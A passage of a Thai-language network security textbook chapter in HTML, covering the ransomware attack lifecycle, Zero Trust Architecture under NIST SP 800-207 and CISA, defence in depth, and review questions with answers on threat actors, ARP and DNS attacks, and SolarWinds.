+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>1. Initial Access ──→ 2. Persistence ──→ 3. Recon ──→ 4. Lateral ──→ 5. Exfil ──→ 6. Deploy ──→ 7. Ransom
+  (ผ่าน VPN,          (สร้าง         (สแกน          Movement         (ขโมย         (เข้ารหัส       (เรียกค่าไถ่)
+   RDP, Phishing)    Backdoor)      Network)        ไปยัง Servers)    ข้อมูล)        Production)</pre>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ขั้นตอน</th><th>ระยะเวลา (ทั่วไป)</th><th>รายละเอียด</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Initial Access</strong></td><td>ชั่วโมงถึงวัน</td><td>VPN/RDP Brute-Force, Phishing, Vulnerability Exploit</td></tr>
+    <tr><td><strong>Persistence + Recon</strong></td><td>วันถึงสัปดาห์</td><td>สร้าง User/Local Admin, สแกน Network, Mapping AD</td></tr>
+    <tr><td><strong>Lateral Movement</strong></td><td>วันถึงสัปดาห์</td><td>ใช้ RDP/PSExec/WMI แพร่กระจายไปยัง Servers</td></tr>
+    <tr><td><strong>Data Exfiltration</strong></td><td>ชั่วโมงถึงวัน</td><td>ขโมยข้อมูลสำคัญ — ใช้ RClone, 7z + FTP/S3</td></tr>
+    <tr><td><strong>Deploy Ransomware</strong></td><td>นาทีถึงชั่วโมง</td><td>มักเริ่มในเวลากลางคืนหรือวันหยุด — สูงสุดของผลกระทบ</td></tr>
+    <tr><td><strong>Ransom Note</strong></td><td>Real-Time</td><td>เรียกค่าไถ่ — ปกติ 1-10 ล้าน USD</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>สถิติ Ransomware ที่สำคัญ:</strong></p>
+<ul>
+  <li><strong>Median Ransom Demand</strong>: 1.20 ล้าน USD (Sophos 2025)</li>
+  <li><strong>Median Ransom Paid</strong>: 1.0 ล้าน USD (Sophos 2025)</li>
+  <li><strong>Payment Rate</strong>: 25% — All-Time Low (Coveware Q4 2024)</li>
+  <li><strong>Ransomware in Breaches</strong>: 44% (Verizon DBIR 2025 — เพิ่มขึ้น 37% YoY)</li>
+  <li><strong>SMB Ransomware</strong>: 88% ของ SMB Breaches เกี่ยวข้องกับ Ransomware (Verizon DBIR 2025)</li>
+</ul>
+</section>
+<hr>
+
+<!-- ====== SECTION 7: ZERO TRUST ====== -->
+<section id="section7" class="section-ref">
+<h2>7. <span class="glossary-term">Zero Trust Architecture<span class="tooltip">แนวคิดด้านความปลอดภัยที่เปลี่ยนกระบวนทัศน์จากการป้องกันที่ Perimeter สู่การตรวจสอบทุกการเข้าถึง — "Never Trust, Always Verify" — ตามมาตรฐาน NIST SP 800-207</span></span> (ZTA)</h2>
+
+<h3 id="section7-1" class="section-ref">7.1 แนวคิดหลัก</h3>
+
+<p>Zero Trust Architecture เป็นแนวคิดด้านความปลอดภัยที่เปลี่ยนกระบวนทัศน์จากการป้องกันที่ Perimeter (Castle-and-Moat) ไปสู่การตรวจสอบทุกการเข้าถึงโดยไม่เชื่อถือสิ่งใดโดยปริยาย — <strong>"Never Trust, Always Verify"</strong></p>
+
+<p><strong>ที่มา:</strong> แนวคิด Zero Trust ถูกเสนอครั้งแรกโดย John Kindervag (Forrester Research) ในปี 2010 และได้รับการพัฒนาต่อเป็นมาตรฐาน <strong>NIST SP 800-207</strong> ในปี 2020</p>
+
+<h3 id="section7-2" class="section-ref">7.2 7 Tenets ของ Zero Trust (NIST SP 800-207)</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>#</th><th>Tenet</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td><strong>All data sources and computing services are resources</strong></td><td>ทุกอย่างคือ Resource — รวมถึง Cloud Services, SaaS, IoT Devices, และ Personal Devices</td></tr>
+    <tr><td>2</td><td><strong>All communication is secured regardless of network location</strong></td><td>ทุกการสื่อสารต้องปลอดภัย — ไม่ว่าจะอยู่ในเครือข่ายองค์กรหรือนอกเครือข่าย</td></tr>
+    <tr><td>3</td><td><strong>Access to resources is granted on a per-session basis</strong></td><td>การเข้าถึงทรัพยากรต้องได้รับอนุมัติ <strong>ทุก Session</strong> — ไม่ใช่ครั้งแรกแล้วใช้ตลอดไป</td></tr>
+    <tr><td>4</td><td><strong>Access is determined by dynamic policy</strong></td><td>นโยบายการเข้าถึงต้องคิดจากหลายปัจจัย — User Identity, Device Health, Location, Data Sensitivity, Request Time</td></tr>
+    <tr><td>5</td><td><strong>The enterprise monitors all owned assets</strong></td><td>องค์กรต้องติดตาม Security Posture ของ Asset ทั้งหมด — อุปกรณ์ทุกชิ้นต้องถูก Monitor</td></tr>
+    <tr><td>6</td><td><strong>All resource authentication and authorization is dynamic and strictly enforced</strong></td><td>Authentication + Authorization ต้องมี Dynamic และเข้มงวด ทุกครั้งก่อนเข้าถึง</td></tr>
+    <tr><td>7</td><td><strong>The enterprise collects as much information as possible</strong></td><td>เก็บข้อมูลเกี่ยวกับ Network, Assets, และ Communications — ใช้ปรับปรุง Security</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section7-3" class="section-ref">7.3 องค์ประกอบของ Zero Trust Architecture</h3>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>┌─────────────────────────────────────────────────────────────┐
+│                    Control Plane                             │
+│  ┌─────────────┐  ┌──────────────┐  ┌──────────────────┐   │
+│  │ Policy      │  │ Policy       │  │ Policy           │   │
+│  │ Engine (PE) │  │ Administrator│  │ Enforcement Point│   │
+│  │ (ตัดสินใจ)   │  │ (สร้าง/ลบ    │  │ (PEP)            │   │
+│  │             │  │  Session)    │  │ (บังคับใช้ Policy)│   │
+│  └──────┬──────┘  └──────┬───────┘  └────────┬─────────┘   │
+│         │               │                    │             │
+└─────────┼───────────────┼────────────────────┼─────────────┘
+          │               │                    │
+          ▼               ▼                    ▼
+┌─────────────────────────────────────────────────────────────┐
+│                     Data Plane                               │
+│  ┌──────────────────────────────────────────────────────┐   │
+│  │  Subject (User/Device) ══════ PEP ══════> Resource   │   │
+│  │           (ผ่าน Policy ก่อนถึง Resource)              │   │
+│  └──────────────────────────────────────────────────────┘   │
+└─────────────────────────────────────────────────────────────┘</pre>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>องค์ประกอบ</th><th>หน้าที่</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Policy Engine (PE)</strong></td><td>ตัดสินใจว่าอนุญาตหรือปฏิเสธการเข้าถึง — ใช้ Policy + Context + Threat Intel</td><td>"User X จาก Device Y ที่ Location Z ต้องการเข้าถึง Resource A — อนุญาตหรือไม่?"</td></tr>
+    <tr><td><strong>Policy Administrator (PA)</strong></td><td>สร้าง/ยกเลิก Session การเข้าถึง — สร้าง Authentication Token</td><td>สร้าง JWT, เรียก PEP ให้เปิด/ปิด Pathway</td></tr>
+    <tr><td><strong>Policy Enforcement Point (PEP)</strong></td><td>จุดบังคับใช้นโยบาย — อยู่ระหว่าง Subject และ Resource</td><td>Gateway, Reverse Proxy, VPN Concentrator, Network FW</td></tr>
+    <tr><td><strong>Control Plane</strong></td><td>เส้นทางควบคุม — PE + PA + PEP ติดต่อกันผ่าน Control Plane</td><td>API Calls, Policy Distribution</td></tr>
+    <tr><td><strong>Data Plane</strong></td><td>เส้นทางข้อมูล — เมื่อ PEP อนุญาตแล้ว Subject ↔ Resource</td><td>Encrypted Tunnel หรือ Direct Connection</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section7-4" class="section-ref">7.4 Zero Trust vs Perimeter-based Security</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>มิติ</th><th>Perimeter-based (Castle-and-Moat)</th><th>Zero Trust</th></tr></thead>
+  <tbody>
+    <tr><td><strong>แนวคิดหลัก</strong></td><td>"เชื่อถือสิ่งที่อยู่ในเครือข่าย"</td><td>"ไม่เชื่อถืออะไรเลย — ตรวจสอบทุกครั้ง"</td></tr>
+    <tr><td><strong>การเข้าถึง</strong></td><td>เข้าเครือข่ายได้ = เข้าถึงทรัพยากรได้เกือบทั้งหมด</td><td>ต้องตรวจสอบทุก Resource Request แยกกัน</td></tr>
+    <tr><td><strong>การแบ่งส่วนเครือข่าย</strong></td><td>VLAN Segmentation ระดับกว้าง</td><td><strong>Microsegmentation</strong> — Per-Workload หรือ Per-Device</td></tr>
+    <tr><td><strong>การตรวจสอบ</strong></td><td>ที่ Perimeter (Firewall) เป็นหลัก</td><td><strong>ทุกจุด</strong> — Network, Endpoint, Application, Data</td></tr>
+    <tr><td><strong>นโยบาย</strong></td><td>IP-based, Port-based — Static</td><td>Identity-based, Device-based, Context-based — <strong>Dynamic</strong></td></tr>
+    <tr><td><strong>Remote Access</strong></td><td>VPN — เข้าเครือข่ายทั้งหมด</td><td>ZTNA — เข้าถึงแค่ Resource ที่ได้รับอนุญาต</td></tr>
+    <tr><td><strong>Default Action</strong></td><td>Deny at Perimeter, Allow Inside</td><td><strong>Deny All</strong> — ทุกที่ ทุกเวลา</td></tr>
+    <tr><td><strong>การตอบสนองเมื่อถูกบุกรุก</strong></td><td>ตรวจจับและไล่ออก — แต่ Lateral Movement ง่าย</td><td>Assume Breach — จำกัดความเสียหายทันที</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section7-5" class="section-ref">7.5 CISA Zero Trust Maturity Model (v2.0, 2023)</h3>
+
+<p>CISA (Cybersecurity and Infrastructure Security Agency) แบ่ง Zero Trust Maturity ออกเป็น 3 ระดับ ใน 5 Pillars:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Pillar</th><th>Traditional (ดั้งเดิม)</th><th>Advanced (ก้าวหน้า)</th><th>Optimal (เหมาะสมที่สุด)</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Identity</strong></td><td>On-Prem AD, Password-based</td><td>MFA + Conditional Access</td><td>Continuous Authentication + Risk-Based</td></tr>
+    <tr><td><strong>Devices</strong></td><td>IT-managed devices only</td><td>MDM/UEM + Compliance Checking</td><td>Real-Time Health Monitoring + Zero Trust Enforcement</td></tr>
+    <tr><td><strong>Networks</strong></td><td>VLANs + Perimeter Firewall</td><td>Microsegmentation + Traffic Encryption</td><td>Fully Distributed + AI-based Threat Detection</td></tr>
+    <tr><td><strong>Applications/Workloads</strong></td><td>On-Prem, VPN Access</td><td>Cloud Hybrid, WAF, API Security</td><td>Serverless, CICD Security, Runtime Protection</td></tr>
+    <tr><td><strong>Data</strong></td><td>Basic Classification</td><td>DLP + Encryption at Rest/In Transit</td><td>Data-Centric Security + Automated Classification</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section7-6" class="section-ref">7.6 Google BeyondCorp — กรณีศึกษา Zero Trust จริง</h3>
+
+<p><strong>BeyondCorp</strong> คือการนำ Zero Trust มาใช้จริงใน Google (2011 — ก่อน Zero Trust จะเป็น Trend):</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>หลักการ BeyondCorp</th><th>รายละเอียด</th></tr></thead>
+  <tbody>
+    <tr><td><strong>No VPN</strong></td><td>ยกเลิก VPN — พนักงานเข้าถึง Resource ผ่าน Internet โดยตรง แต่ต้องตรวจสอบ Identity + Device</td></tr>
+    <tr><td><strong>Device Inventory</strong></td><td>ทุกอุปกรณ์ต้องอยู่ใน Inventory — ตรวจสอบ Health, OS Version, Patch Level</td></tr>
+    <tr><td><strong>Access Proxy</strong></td><td>Request ผ่าน Access Proxy ก่อนถึง Resource — Proxy ตรวจสอบ Policy</td></tr>
+    <tr><td><strong>Trust Inferno</strong></td><td>ไม่เชื่อถืออะไร — Trust ต้องถูกสร้างใหม่ทุกครั้ง</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>ผลลัพธ์ของ BeyondCorp ใน Google:</strong></p>
+<ul>
+  <li>พนักงาน 100,000+ คน ทำงานจากทุกที่ในโลก — ไม่ต้องใช้ VPN</li>
+  <li>Access Control ละเอียดระดับ Application — ไม่ใช่ระดับ Network</li>
+  <li>ลดความเสี่ยงจาก Compromised Credentials — Device Health มาช่วยอีกชั้น</li>
+</ul>
+</section>
+<hr>
+
+<!-- ====== SECTION 8: DEFENSE IN DEPTH ====== -->
+<section id="section8" class="section-ref">
+<h2>8. การป้องกันเชิงลึกและการอยู่รอดของเครือข่าย</h2>
+
+<h3>8.1 Defense in Depth สำหรับการป้องกันการโจมตี</h3>
+
+<p>การป้องกันเครือข่ายจากการโจมตีต้องใช้หลักการ Defense in Depth (การป้องกันเชิงลึก) — ไม่มีมาตรการป้องกันชั้นเดียวที่เพียงพอ:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Layer</th><th>มาตรการ</th><th>ป้องกันการโจมตีใด</th></tr></thead>
+  <tbody>
+    <tr><td><strong>1 — Policy & Governance</strong></td><td>Security Policy, Risk Assessment, Incident Response Plan</td><td>ทุกประเภท — กำหนดแนวทาง</td></tr>
+    <tr><td><strong>2 — Physical Security</strong></td><td>Data Center Access Control, CCTV, Locks</td><td>Physical Access Attacks</td></tr>
+    <tr><td><strong>3 — Network Perimeter</strong></td><td>Firewall, DDoS Protection, WAF</td><td>DDoS, Port Scanning, Web Attacks</td></tr>
+    <tr><td><strong>4 — Network Internal</strong></td><td>IDS/IPS, Network Segmentation, NAC</td><td>ARP Spoofing, MITM, Lateral Movement</td></tr>
+    <tr><td><strong>5 — Endpoint</strong></td><td>EDR, Anti-Malware, HIPS, Hardening</td><td>Malware, Ransomware, Fileless Attacks</td></tr>
+    <tr><td><strong>6 — Application</strong></td><td>Secure Coding, SAST/DAST, WAF</td><td>XSS, SQL Injection, CSRF</td></tr>
+    <tr><td><strong>7 — Data</strong></td><td>Encryption, DLP, Access Control</td><td>Data Leakage, Unauthorized Access</td></tr>
+    <tr><td><strong>8 — Identity</strong></td><td>MFA, IAM, Least Privilege</td><td>Credential Theft, Privilege Escalation</td></tr>
+    <tr><td><strong>9 — Monitoring</strong></td><td>SIEM, SOAR, SOC 24/7</td><td>All — Detection and Response</td></tr>
+    <tr><td><strong>10 — Recovery</strong></td><td>Backup, DR, BCP</td><td>Ransomware, Data Loss</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<!-- ====== SECTION 9: SUMMARY ====== -->
+<section id="section9" class="section-ref">
+<h2>9. สรุปท้ายบท (Chapter Summary)</h2>
+
+<h3>9.1 หลักการสำคัญ</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>หัวข้อ</th><th>สรุป</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Threat Actors</strong></td><td>6 ประเภทหลัก — Nation-State (APT), Cyber Criminal, Hacktivist, Insider, Script Kiddie, Organized Crime — แต่ละประเภทมีแรงจูงใจ เป้าหมาย และความสามารถที่แตกต่างกัน</td></tr>
+    <tr><td><strong>Attack Surface</strong></td><td>จุดรวมของช่องทางที่ผู้โจมตีสามารถใช้ได้ — การลด Attack Surface เป็นแนวทางสำคัญด้วย Minimal Service, Least Privilege, Segmentation, Patch Management, Hardening</td></tr>
+    <tr><td><strong>Cyber Kill Chain</strong></td><td>7 ขั้นตอน: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions — Unified Kill Chain ขยายเป็น 18 ขั้นตอน 3 ระยะ</td></tr>
+    <tr><td><strong>Diamond Model</strong></td><td>วิเคราะห์ 4 มุม: Adversary, Capability, Infrastructure, Victim — บวก Social-Political และ Technology</td></tr>
+    <tr><td><strong>Threat Modeling</strong></td><td>STRIDE (จำแนกภัย), DREAD (จัดลำดับ — deprecated), PASTA (7 ขั้นตอนละเอียด), MITRE ATT&CK (14 Tactics, หลายร้อย Techniques)</td></tr>
+    <tr><td><strong>Network Layer Attacks</strong></td><td>ARP Spoofing → DAI; DNS Poisoning → DNSSEC; IP Spoofing → BCP 38; MITM → Encryption + Authentication; Session Hijacking → Secure Cookies</td></tr>
+    <tr><td><strong>Malware</strong></td><td>10+ ประเภท — Virus, Worm, Trojan, Ransomware, Botnet, Rootkit, Spyware, Keylogger, Fileless, Adware — Ransomware เป็นภัยคุกคามที่ร้ายแรงที่สุดในปัจจุบัน</td></tr>
+    <tr><td><strong>Zero Trust</strong></td><td>"Never Trust, Always Verify" — 7 Tenets ตาม NIST SP 800-207 — เปรียบเทียบกับ Perimeter-Based Security — CISA 5 Pillars Maturity Model — Google BeyondCorp</td></tr>
+  </tbody>
+</table></div>
+
+<h3>9.2 ตัวเลขสำคัญที่ควรจำ</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ตัวเลข</th><th>ความหมาย</th></tr></thead>
+  <tbody>
+    <tr><td><strong>4.92 ล้าน USD</strong></td><td>ค่าเสียหายเฉลี่ยจาก Insider Threat — สูงที่สุด (IBM 2025)</td></tr>
+    <tr><td><strong>44%</strong></td><td>สัดส่วน Ransomware ใน Breaches ทั้งหมด (Verizon DBIR 2025)</td></tr>
+    <tr><td><strong>60%</strong></td><td>Breaches ที่เกี่ยวข้องกับ Human Element</td></tr>
+    <tr><td><strong>14</strong></td><td>จำนวน Tactics ใน MITRE ATT&CK Enterprise</td></tr>
+    <tr><td><strong>7</strong></td><td>ขั้นตอนของ Cyber Kill Chain (Lockheed Martin)</td></tr>
+    <tr><td><strong>7</strong></td><td>Tenets ของ Zero Trust (NIST SP 800-207)</td></tr>
+    <tr><td><strong>5</strong></td><td>Pillars ของ CISA Zero Trust Maturity Model</td></tr>
+    <tr><td><strong>22%</strong></td><td>Edge Device/VPN Attacks เพิ่มขึ้น 8 เท่า (Verizon DBIR 2025)</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<!-- ====== REVIEW QUESTIONS ====== -->
+<section id="review-questions" class="section-ref">
+<h2><i class="fas fa-question-circle" aria-hidden="true"></i> คำถามทบทวน (Review Questions)</h2>
+<p style="color:var(--text-secondary);margin-bottom:1.5rem;">คลิกปุ่ม <strong>"🔍 ดูเฉลย"</strong> เพื่อเปิดคำตอบ</p>
+
+<div class="quiz-card" data-question="1">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 1</span>
+    <p>จงยกตัวอย่าง Threat Actors 4 ประเภท พร้อมอธิบายแรงจูงใจ เป้าหมาย และระดับความสามารถ — และยกตัวอย่างกลุ่ม APT ที่สำคัญอย่างน้อย 2 กลุ่ม</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> Threat Actors 6 ประเภทหลัก: (1) <strong>Nation-State</strong> — แรงจูงใจทางการเมือง, ความสามารถสูงมาก, ตัวอย่าง APT: APT29 (รัสเซีย), Lazarus Group (เกาหลีเหนือ); (2) <strong>Cyber Criminal</strong> — แรงจูงใจทางการเงิน, ความสามารถปานกลาง-สูง, ตัวอย่าง: REvil, LockBit; (3) <strong>Hacktivist</strong> — แรงจูงใจทางอุดมการณ์, ความสามารถต่ำ-ปานกลาง, ตัวอย่าง: Anonymous; (4) <strong>Insider Threat</strong> — แรงจูงใจจากความไม่พอใจ/ผลประโยชน์, ความสามารถแปรผันตามสิทธิ์; (5) <strong>Script Kiddie</strong> — ความท้าทาย, ความสามารถต่ำ; (6) <strong>Organized Crime</strong> — การเงิน, ความสามารถปานกลาง <strong>กลุ่ม APT สำคัญ:</strong> APT29 (Cozy Bear — รัสเซีย) เจ้าของ SolarWinds Attack, Lazarus Group (เกาหลีเหนือ) เจ้าของ Bangladesh Bank 81M USD และ WannaCry</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="2">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 2</span>
+    <p>จงเปรียบเทียบ Cyber Kill Chain (Lockheed Martin) กับ Unified Kill Chain — แตกต่างกันอย่างไร? ข้อจำกัดของ Cyber Kill Chain คืออะไร?</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>Cyber Kill Chain (CKC)</strong> มี 7 ขั้นตอน: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives — เป็นแบบ Linear (เรียงตามลำดับ) <strong>Unified Kill Chain (UKC)</strong> พัฒนาต่อโดย Paul Pols (2017) มี 18 ขั้นตอน แบ่งเป็น 3 ระยะ: Phase A (In), Phase B (Through), Phase C (Out) — รองรับการโจมตีสมัยใหม่ที่ซับซ้อนมากขึ้น <strong>ข้อจำกัดของ CKC:</strong> (1) เป็นแบบ Linear ไม่สะท้อนการโจมตีที่ข้ามขั้นตอนหรือวนซ้ำ; (2) ไม่ครอบคลุม Insider Threat ที่ไม่ต้องผ่าน Recon/Weaponize/Delivery; (3) ไม่รองรับ Supply Chain Attack ที่แทรก Code ใน Build Process (SolarWinds)</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="3">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 3</span>
+    <p>อธิบายความแตกต่างระหว่าง STRIDE, PASTA และ MITRE ATT&CK ในการทำ Threat Modeling — Framework ใดเหมาะกับสถานการณ์ใด?</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>STRIDE</strong> (Microsoft) — จำแนกภัยคุกคาม 6 ประเภท: Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege — เหมาะกับการออกแบบระบบใหม่ (Design Phase) <strong>PASTA</strong> (Tony UcedaVelez, 2012) — 7 ขั้นตอน Risk-Centric, เชื่อม Business Context กับ Technical — เหมาะกับระบบสำคัญ (Critical Systems) <strong>MITRE ATT&CK</strong> — ฐานความรู้ 14 Tactics หลายร้อย Techniques จากข้อมูลจริง — มี Mitigation และ Detection — เหมาะกับ SOC, Red Team, Threat Intel <strong>สรุป:</strong> STRIDE ใช้ตอนออกแบบ, PASTA ใช้วิเคราะห์เชิงลึก, MITRE ATT&CK ใช้ในการดำเนินงานด้าน Detection และ Response</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="4">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 4</span>
+    <p>ARP Spoofing ทำงานอย่างไร? จงอธิบายขั้นตอน ผลกระทบ และมาตรการป้องกันทุกระดับ (Network → Application)</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> ARP Spoofing อาศัยจุดอ่อนที่ ARP Protocol ไม่มีการตรวจสอบความถูกต้อง — ผู้โจมตีส่ง ARP Reply ปลอมไปยังเหยื่อเพื่อให้ MAC ของผู้โจมตีถูกแมปกับ IP ของ Gateway <strong>ผลกระทบ:</strong> (1) MITM — Traffic ผ่านผู้โจมตี; (2) DoS — ทำให้ติดต่อ Gateway ไม่ได้; (3) Session Hijacking — ขโมย Session Cookies <strong>การป้องกัน (Network → Application):</strong> (1) <strong>Switch</strong> — Dynamic ARP Inspection (DAI), Port Security; (2) <strong>Network</strong> — VLAN Segmentation; (3) <strong>Endpoint</strong> — Static ARP Entry; (4) <strong>Application</strong> — Encryption (HTTPS/TLS/VPN) เพื่อปกป้องข้อมูลแม้ Traffic ถูกดักจับ</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="5">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 5</span>
+    <p>DNS Poisoning มีเทคนิคอะไรบ้าง? DNSSEC, DoH และ DoT ช่วยป้องกันอย่างไร?</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>เทคนิค DNS Poisoning:</strong> (1) DNS Cache Poisoning (Classic) — ส่ง Response ปลอมพร้อม Transaction ID; (2) DNS Pharming — เปลี่ยน DNS Setting บน Router; (3) DNS Tunneling — ใช้ DNS Queries เป็น C2 Channel; (4) DNS Amplification DDoS — ใช้ Open Resolver โจมตีแบบ Reflection <strong>การป้องกัน:</strong> <strong>DNSSEC</strong> — เพิ่ม Digital Signature ใน DNS Records ตรวจสอบความถูกต้องของ Response ป้องกัน Cache Poisoning; <strong>DoH (DNS over HTTPS)</strong> และ <strong>DoT (DNS over TLS)</strong> — เข้ารหัส DNS Query ป้องกันการดักจับและแก้ไขระหว่างทาง; นอกจากนี้ควรใช้ Random Transaction ID + Port และ Trusted DNS Resolvers (Cloudflare 1.1.1.1, Google 8.8.8.8, Quad9 9.9.9.9)</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="6">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 6</span>
+    <p>จงอธิบายวงจรชีวิตของ Ransomware ตั้งแต่ Initial Access ไปจนถึง Ransom Note — รวมถึงประเภทต่างๆ (Double Extortion, Triple Extortion, RaaS)</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>Ransomware Attack Timeline:</strong> (1) Initial Access (ชม.-วัน) — ผ่าน VPN/RDP Brute-Force, Phishing; (2) Persistence + Recon (วัน-สัปดาห์) — สร้าง User, สแกน Network; (3) Lateral Movement (วัน-สัปดาห์) — ใช้ RDP/PSExec/WMI แพร่กระจาย; (4) Data Exfiltration (ชม.-วัน) — ขโมยข้อมูลด้วย RClone; (5) Deploy Ransomware (นาที-ชม.) — มักเริ่มเวลากลางคืน; (6) Ransom Note — เรียกค่าไถ่ 1-10 ล้าน USD <strong>ประเภท:</strong> <strong>Encryptor</strong> — เข้ารหัสไฟล์; <strong>Locker</strong> — ล็อกหน้าจอ; <strong>Double Extortion</strong> — เข้ารหัส + ขโมยข้อมูล (DarkSide); <strong>Triple Extortion</strong> — Double + DDoS; <strong>RaaS</strong> — แพลตฟอร์มให้ Affiliate เช่าใช้ (LockBit, BlackCat)</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="7">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 7</span>
+    <p>Zero Trust Architecture แตกต่างจาก Perimeter-based Security อย่างไร? จงอธิบาย 7 Tenets ตาม NIST SP 800-207</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>ความแตกต่างหลัก:</strong> Perimeter-based เชื่อถือสิ่งที่อยู่ในเครือข่าย ตรวจสอบที่ Firewall เป็นหลัก ใช้ VLAN Segmentation, Static IP-based Policy — Zero Trust ไม่เชื่อถืออะไรเลย ตรวจสอบทุก Request ใช้ Microsegmentation, Dynamic Identity-based Policy, Assume Breach <strong>7 Tenets (NIST SP 800-207):</strong> (1) All data sources and computing services are resources; (2) All communication is secured regardless of network location; (3) Access is granted on a per-session basis; (4) Access is determined by dynamic policy (Identity, Device, Location, Data Sensitivity); (5) Monitor all owned assets; (6) All authentication and authorization is dynamic and strictly enforced; (7) Collect as much information as possible to improve security</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="8">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 8</span>
+    <p>CISA Zero Trust Maturity Model มีกี่ Pillars? อะไรบ้าง? และแต่ละ Pillar มี Maturity Level อย่างไร?</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> CISA Zero Trust Maturity Model (v2.0, 2023) มี <strong>5 Pillars</strong> ได้แก่ (1) <strong>Identity</strong>, (2) <strong>Devices</strong>, (3) <strong>Networks</strong>, (4) <strong>Applications/Workloads</strong>, (5) <strong>Data</strong> แต่ละ Pillar มี 3 Maturity Levels: <strong>Traditional</strong> (ดั้งเดิม) — เช่น On-Prem AD, VLANs, VPN; <strong>Advanced</strong> (ก้าวหน้า) — เช่น MFA, Microsegmentation, DLP; <strong>Optimal</strong> (เหมาะสมที่สุด) — เช่น Continuous Authentication, AI-based Detection, Data-Centric Security <strong>เป้าหมาย:</strong> ย้ายจาก Traditional → Optimal ในทุก Pillar เพื่อให้มั่นใจว่า Zero Trust ครอบคลุมทุกมิติขององค์กร</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="9">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 9</span>
+    <p>จงวิเคราะห์การโจมตี SolarWinds โดยใช้กรอบ Cyber Kill Chain — ขั้นตอนใดบ้างที่ SolarWinds ไม่สามารถตรวจจับหรือป้องกันได้?</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>SolarWinds ผ่าน Cyber Kill Chain:</strong> (1) <strong>Recon</strong> — NOBELIUM ศึกษา Build Environment; (2) <strong>Weaponize</strong> — สร้าง SUNBURST Backdoor; (3) <strong>Deliver</strong> — แทรกผ่าน Orion Update (Supply Chain); (4) <strong>Exploit</strong> — Trusted Update Mechanism; (5) <strong>Install</strong> — DLL ถูก Sign ด้วย Certificate จริง; (6) <strong>C2</strong> — DNS Beaconing ผ่าน DGA; (7) <strong>Actions</strong> — Lateral Movement, Exfil <strong>ขั้นตอนที่ป้องกัน/ตรวจจับไม่ได้:</strong> การ Deliver และ Exploit อาศัยช่องทางที่ถูก Trust — ซอฟต์แวร์ที่ Sign แล้ว, Build Pipeline ที่สะอาด — ดังนั้นกระบวนการตรวจสอบแบบดั้งเดิม (Signature-based AV) ตรวจจับไม่ได้ ต้องใช้ Behavioral Detection, EDR, SBOM, และ Zero Trust</p>
+  </div>
